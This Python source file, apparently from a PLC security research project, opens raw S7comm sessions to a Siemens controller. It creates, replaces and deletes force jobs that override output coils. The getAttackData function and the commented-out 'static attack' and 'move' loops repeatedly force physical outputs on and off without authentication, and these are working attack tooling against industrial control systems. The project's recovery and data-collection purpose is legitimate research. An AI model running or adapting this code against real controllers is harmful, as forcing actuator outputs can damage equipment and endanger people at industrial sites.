from time import sleep, time
import socket
import sys
from scapy.all import get_if_hwaddr
from scapy.all import getmacbyip
# from .ForceVector import *
from PLCrecover.ForceVector import *
from time import sleep

sockStart = False
sock = None

# Tested
def create_connection(dest_ip, port):
    # Create connection, default port is 102
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        print("socket error")
        sys.exit(1)
    
    HOST = dest_ip
    try:
        sock.settimeout(20)
        sock.connect((HOST, port))
    except socket.error:
        print("create connection failed")
    else:
        print("Connected to Server: %s" % dest_ip)
    return sock

# Tested
def getJobRefNumber(pkt, descrip):
    # pkt convert to hex string
    # print("before, pkt is: ", pkt)
    pkt = bytearray(pkt).hex()
    # pkt = pkt.encode('hex')
    # pkt = bytearray(pkt[0]).hex()
    # print("In get job ref, pkt is: ", pkt)

    descripList = {"Read job list": 16, "Force": 9}

    # check the pkt is the read job list response
    checkSubStr = pkt[21*2: 21*2 + 6]
    if not checkSubStr == "128110": # Method is "res", subfunc is read job list
        print("Wrong input format, please input the read job list response")
        return None
    
    # get the job reference number
    TisDataSz = int(pkt[35*2: 35*2 + 4], 16) * 2 # one byte is two char]
    # print(TisDataSz)
    JobItems = pkt[-TisDataSz:]
    for i in range(0, TisDataSz - 1, 8):    # four bytes a job item 
        if int(JobItems[i:i+2], 16) == descripList[descrip]:
            return int(JobItems[i+2: i+4], 16)
    
    # print("Not found a <", descrip, "> in this pkt, return None")
    return None

# Tested
def getByteArray(job):
    # job must be a job
    if not isinstance(job, Job):
        print("Error, not a Job instance")
        return None
    return bytearray.fromhex(job.get())

def startSock(targetIP, targetPort):
    global sock, sockStart
    sock = create_connection(targetIP, targetPort)
    sockStart = True
    print("The socket to ", targetIP, " has started")

    # start connection
    COTP_CON = bytearray.fromhex("0300001611e00000000400c1020100c2020102c0010a")
    S7COMM_CON = bytearray.fromhex("0300001902f08032010000020000080000f0000001000101e0")

    # test for this is a must or not
    sock.send(COTP_CON)
    sock.recvfrom(1024)
    sock.send(S7COMM_CON)
    sock.recvfrom(1024)

def closeSock():
    global sock, sockStart
    sock.close()
    sockStart = False
    print("A socket has been closed")

def deleteForceJob(targetIP, targetPort):
    # delet the force job
    global sock, sockStart
    if not sockStart:
        startSock(targetIP, targetPort)

    readjob = ReadJob()
    READ_DATA = getByteArray(readjob)

    sock.send(READ_DATA)
    dataBack = sock.recv(1024)
    refNumber = getJobRefNumber(dataBack, 'Force')

    # delete the refered job
    if refNumber is None:
        print("no force job yet, nothing to delete")
        return
    
    deletejob = DeleteJob(refNumber)
    DELETE_DATA = getByteArray(deletejob)

    sock.send(DELETE_DATA)
    sock.recv(1024)
    print("Delete job ok!")
    closeSock()

def createForceJob(targetIP, targetPort, addrs, vals):
    global sock, sockStart
    if not sockStart:
        startSock(targetIP, targetPort)
    
    forcejob = ForceJob(addrs, vals, len(addrs))
    FORCE_DATA = getByteArray(forcejob)

    sock.send(FORCE_DATA) 
    sock.recv(1024)
    try:
        sock.recv(1024)
    except:
        print("Create force job recv error")
    # print("a is : ", a, " b is : ", b)
    # print("Force job ok!")

def replaceForceJob(targeIP, targetPort, addrs, vals):
    global sock, sockStart
    if not sockStart:
        startSock(targeIP, targetPort)

    readjob = ReadJob()
    READ_DATA = getByteArray(readjob)

    sock.send(READ_DATA)
    dataBack = sock.recv(1024)
    refNumber = getJobRefNumber(dataBack, 'Force')

    # replace the job with new force job
    if refNumber is None:
        print("no force job yet, nothing to delete")

    replacejob = ReplaceJob(addrs, vals, len(addrs), refNumber) 
    REPLACE_DATA = getByteArray(replacejob)

    sock.send(REPLACE_DATA)
    sock.recv(1024)
    try:
        sock.recv(1024)
    except:
        print("Create force job recv error")
    print("Replace force job ok!")

def recoverStrategyPassive(targetIP, targetPort):
    deleteForceJob(targetIP, targetPort)

def recoverStrategyPositive(targetIP, targetPort, addrs, vals, time_now):
    deleteForceJob(targetIP, targetPort)
    createForceJob(targetIP, targetPort, addrs, vals)
    print(time() - time_now)
    
def safeSleep(n):
    global startSock
    sleep(n)
    startSock = False

def testForINT(whichBit, times):
    targetIP = "192.168.0.2"
    targetPort = 102
    addrs = [whichBit]
    vals0 = [0]
    vals1 = [1]
    
    startSock(targetIP, targetPort)
    # only test for bit setting
    createForceJob(targetIP, targetPort, addrs, vals1)
    for i in range(times):
        sleep(0.1)
        replaceForceJob(targetIP, targetPort, addrs, vals0)
        sleep(0.1)
        replaceForceJob(targetIP, targetPort, addrs, vals1)
    replaceForceJob(targetIP, targetPort, addrs, vals0)

    deleteForceJob(targetIP, targetPort)

    closeSock()

def getAttackData(targetList, valueList, ForceTime, GapTime):
    PLC_IP = "192.168.0.2"
    PLC_PORT = 102

    # check if the value and address length are the same
    if not len(valueList) == len(targetList):
        print("Error, uncompatible length in the list")
        return

    valR = 0

    # delete the force
    deleteForceJob(PLC_IP, PLC_PORT)

    # force data pieces
    i = 0
    while i < len(targetList):
        # start connetion    
        startSock(PLC_IP, PLC_PORT)

        addr = targetList[i]
        val = valueList[i]
        createForceJob(PLC_IP, PLC_PORT, [addr], [val])
        closeSock()

        sleep(ForceTime)

        startSock(PLC_IP, PLC_PORT)
        replaceForceJob(PLC_IP, PLC_PORT, [addr], [valR]) # valR = 0
        closeSock()

        startSock(PLC_IP, PLC_PORT)
        deleteForceJob(PLC_IP, PLC_PORT)
        print("task ", i, " has completed, the target is ", targetList[i])
        # close socket
        closeSock() 

        i = i + 1

        sleep(GapTime)

if __name__ == "__main__":

    PLC_IP = "192.168.0.2"
    PLC_PORT = 102

    start = time()
    createForceJob(PLC_IP, PLC_PORT, ['Q1.1'], [1])
    sleep(2)
    deleteForceJob(PLC_IP, PLC_PORT)
    createForceJob(PLC_IP, PLC_PORT, ['Q1.1'], [0])

    # deleteForceJob(PLC_IP, PLC_PORT)
    end = time()
    print(end - start)

#     # print("Start for INT testing!")
#     # testForINT('Q5.5', 200)

#     # no movement
#     targetListStatic = ['Q15.1', 'Q15.2', 'Q15.3', 'Q15.4', 'Q15.5', 'Q16.3', 'Q16.4', 'Q16.5', 'Q16.6', 'Q16.7', 'Q17.0', 'Q17.1', 'Q17.2', 'Q17.3', 'Q17.4', 'Q17.5', 'Q17.6']
#     valueListStatic = [     1,      1,     1,      1,      1,      1,      1,       1,      1,     1,      1,      1,      1,       1,     1,      1,      1]

#     # with control to movement
#     targetListMove = ['Q15.7'] # up control 
#     valueListMove = [1]


#     ForceTime = 5 # second
#     GapTime = 1
    
#     # for i in range(10):
#     #     getAttackData(targetListStatic, valueListStatic, ForceTime, GapTime) # static attack
#     #     print("======================\nDone with attack ", i)
#     #     sleep(60)
            
#     # getAttackData(targetListMove, valueListMove, ForceTime, GapTime) # move
#     # print("Done with attack data") 

#     # test 4/14
#     #   for python 2.7 compatibility on win7
#     # createForceJob(PLC_IP, PLC_PORT, ['Q2.2'], [0])
#     # sleep(2)
#     # deleteForceJob(PLC_IP, PLC_PORT)

#     # closeSock()

#     from multiprocessing import Process
#     proc = Process(target=deleteForceJob, args=(PLC_IP, PLC_PORT,))
#     proc.start()
#     print("proc started")
